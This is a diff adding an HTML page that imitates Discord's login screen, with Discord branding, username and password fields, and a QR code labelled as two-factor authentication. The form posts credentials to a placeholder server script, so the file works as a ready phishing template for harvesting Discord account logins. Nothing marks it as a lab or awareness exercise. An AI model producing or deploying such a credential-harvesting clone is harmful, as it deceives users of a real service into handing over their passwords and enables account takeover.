@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Login - Dark Mode</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #36393F; /* Dark background color */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: #2F3136; /* Darker container background */
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+            width: 300px;
+            text-align: center;
+            position: relative;
+        }
+        .login-container:before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://cdn.discordapp.com/attachments/874992455782266152/992284076303781120/7f10e0a6-b0c3-4df2-836a-1280d00017bb.png'); /* Replace with your background image */
+            background-size: cover;
+            opacity: 0.2; /* Adjust opacity as needed */
+            z-index: -1;
+            border-radius: 8px;
+        }
+        .login-container h1 {
+            color: #7289DA; /* Discord's brand color */
+            margin-bottom: 20px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        .input-group label {
+            display: block;
+            text-align: left;
+            margin-bottom: 5px;
+            color: #FFFFFF; /* White text color */
+        }
+        .input-group input[type="text"],
+        .input-group input[type="password"] {
+            width: 100%;
+            padding: 8px;
+            font-size: 16px;
+            border-radius: 4px;
+            border: 1px solid #4E535D; /* Darker border color */
+            background-color: #40444B; /* Darker input background */
+            color: #FFFFFF; /* White text color */
+            box-sizing: border-box;
+        }
+        .input-group input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            border: none;
+            background-color: #7289DA; /* Discord's brand color */
+            color: #FFFFFF; /* White text color */
+            cursor: pointer;
+            border-radius: 4px;
+        }
+        .input-group input[type="submit"]:hover {
+            background-color: #627EB7; /* Darker shade for hover effect */
+        }
+        .qr-code {
+            margin-top: 20px;
+            color: #FFFFFF;
+        }
+        .qr-code img {
+            width: 100px; /* Adjust size as needed */
+            height: 100px; /* Adjust size as needed */
+            border-radius: 4px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>Discord Login</h1>
+        <form action="your_server_script_here" method="POST">
+            <div class="input-group">
+                <label for="username">Username or Email</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <div class="input-group">
+                <input type="submit" value="Login">
+            </div>
+        </form>
+        <div class="qr-code">
+            <p>Scan QR Code for Two-Factor Authentication</p>
+            <img src="data:image/png;base64,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" alt="QR Code">
+        </div>
+    </div>
+</body>
+</html>
